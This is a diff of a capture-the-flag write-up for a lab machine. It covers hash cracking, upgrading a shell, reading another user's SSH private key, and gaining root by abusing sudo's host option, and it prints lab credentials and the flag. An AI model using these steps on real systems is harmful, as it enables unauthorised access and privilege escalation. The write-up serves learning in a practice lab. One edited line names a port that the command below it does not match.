@@ -4,7 +4,8 @@ It seems, through me trying it, that ports between those numbers is also running
 If we try to ssh into it, we get the response Lower or Higher depending on which port number we choose. The hint is O(log n), which I assume it is a hint to the search algorithm to use. Can't remember
 the name of it, but you start with a min and a max and a middle. If middle==lower, it becomes the new min. If higher it becomes the new max. Continue until you found the port.
 
-Trough this process, we find that if we try to ssh to port 12967 we get an interesting message:
+Trough this process, we find that if we try to ssh to port 10211 we get an interesting message:
+
 # ssh -o "StrictHostKeyChecking no" -p 12967 10.10.177.183
 Warning: Permanently added '[10.10.177.183]:12967' (RSA) to the list of known hosts.
 You've found the real service.
@@ -58,7 +59,7 @@ Here we find out that it is the poem Jabberwocky, with a line amended at the end
 "Your secret is bewareTheJabberwock"
 
 When we enter the secret in the ssh-prompt we get:
-jabberwock:StumbledDignifiedTrailingDisrespectful
+jabberwock:DeeplyGleamBroilingStuffed
 
 which looks like credentials.
 
@@ -161,14 +162,14 @@ Match User jabberwock
 So we'll just work from the reverse shell for now.
 
 I'm not great at reading this output. Does this mean that tweedledee can run /bin/bash
-as sudo without as password? Or does it just mean that tweedledum can run /bin/bash without a password?
+as sudo without as password? Or does it just mean that tweedledee can run /bin/bash without a password?
 tweedledum@looking-glass:~$ sudo -l
 sudo -l
 Matching Defaults entries for tweedledum on looking-glass:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User tweedle may run the following commands on looking-glass:
+User tweedledee may run the following commands on looking-glass:
     (tweedledee) NOPASSWD: /bin/bash
 
 This means that I want to side-escalate (is that a word?) to tweedledee.
@@ -192,3 +193,116 @@ Lets see if we can crack them using hashcat:
 fasttrack.txt and rockyou.txt seems to crack different hashes, and only 3-4 of them.
 
 I've saved the ones I cracked with hashcat, and googled, in list.txt
+
+The hashes can be decrypted to (in no specific order):
+maybe
+one
+of
+these
+is
+the
+password
+
+Some of them I was able to find in fasttrack.txt, rockyou.txt and milw0rm.txt.
+Funnily enough, fasttrack.txt was unable to find "maybe", even though it is in the list.
+
+The only hash that I haven't found the cleartext for is
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+None of the usual websites finds a cleartext for it.
+
+At this point I'm quite lost, so I had a peek at a walkthrough.
+It hinted to the fact that the reson I can't find a sha256-cleartext is because
+its not a SHA256 hash, but a hex-number. Which, if we look at the string
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+
+it seems to be patterns recurring. Ie, "73" occurs 3-4 times, there is quite a lot
+of 7:s etc. In other words, it doesn't really look like a hash, which would look
+more random.
+
+If we decode it from hex using CyberChef we get the string:
+"the password is zyxwvutsrqponmlk"
+
+So I assume that the password to the humptydumpty user is zyxwvutsrqponmlk
+
+Although, now we run into another issue:
+su humptydumpty
+su: must be run from a terminal
+
+This blog-post outlines a few ways of doing it:
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+One of those ways is to use python to spawn a shell, which worked:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+tweedledum@looking-glass:/home$
+
+And we can now su to humptydumpty:
+humptydumpty@looking-glass:~$ id
+id
+uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
+
+I can't find much useful things here. There is a poetry.txt in humptydumpty:s home-dir,
+where he explains a poem to alice.
+
+However, if we take a look at the home-directories we see that /home/alice have
+the x-bit set for all users. For directories, this means that we can access files
+in it, but we can't "read" (list files) in it.
+
+One way to get around this is to cd into it, and use cd:s tab completion to enumerate
+directories and files. Unfortunately, our shell is crappy enough so that is not possible.
+Lets see if we can amend that by spawning a better shell somehow.
+
+By reading this blog post https://0xffsec.com/handbook/shells/full-tty/ I found that 
+we could get a fully interactive shell by Ctrl-Z:ing nc to the background, run
+stty raw -echo && fg
+
+and then we have a fuly interactive shell with tab completion. I dont quite fully
+understand how shells work, so this is something I need to read up on.
+
+Lets go ahead and enumerate /home/alice. One thing I remember about alice,
+if we refer to earlier in the writeup, is that alice is not blocked from ssh:ing
+into the machine, according to /etc/ssh/sshd_config. So if we can get a hold
+of a password, or plant an ssh key, we dont have to everything through a reverse shell.
+
+Turns out we still cant tab-complete cd, but we should be able to find out if .ssh/authorized_keys exists.
+Yup:
+humptydumpty@looking-glass:/home/alice$ file /home/alice/.ssh/authorized_keys
+/home/alice/.ssh/authorized_keys: OpenSSH RSA public key
+
+And we can access alice:s private/public keys:
+humptydumpty@looking-glass:/home$ cat /home/alice/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+KEY
+-----END RSA PRIVATE KEY-----
+
+humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY+dwBeKw2NtTbGLN+3hpg+qZ9ebXvfkU+UZ/iP0TFmGWaYM0hFyE9oVSoldBmLmvJAfpjFk/kgglcQ0r5rhahEPI+jIYr/retdOf8hZYpCRr21DbGt2fLF3Bu2Io/Uvhur/i9Tc5RwD5pgfGqHKrf1qul5x4dWK36NU+uIeIIDveTuAcKCmTBZzM1rkwwaj7UKDiJ/N9+/i6E+TEEsuXd/isF/zhGa4oQTLpthn79Y4SAeV+SzmeAWeJbvHZHe/KrvHIOvCJcSN9bjJh76QuIZnLKTWJrscaE0qkhG5890l1P6s0auNgUuOHN5ZgGYfHsmSGQRQUhXHplXXL6CKF alice@looking-glass
+
+So lets copy them both to our kali-machine, and see if we can ssh into alice@looking-glass.
+Bingo! Now we can finally leave the revshell behind, here's to hoping that the
+ssh key doesn't change at reboot.
+$ ssh -i alice alice@10.10.88.109
+Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
+alice@looking-glass:~$ id
+uid=1005(alice) gid=1005(alice) groups=1005(alice)
+
+What to do now?
+Remember that tweedledee can run /bin/bash as sudo, so we want to become
+tweedledee.
+
+Once again got stuck and consulted a walkthrough. I can't run sudo -l as alice,
+since it prompts for a password I dont have, but I can cat /etc/sudoers.d/alice,
+and then we get:
+/etc/sudoers.d$ cat alice
+alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
+
+ssalg-gnikool is "looking-glass" backwards, which means that alice can
+run /bin/bash as root from the host ssalg-gnikool.
+
+By using the -h option, we are able to run /bin/bash:
+alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
+sudo: unable to resolve host ssalg-gnikool
+root@looking-glass:~#
+
+And we have the flag
+# cat /root/root.txt | rev
+thm{bc2337b6f97d057b01da718ced6ead3f}
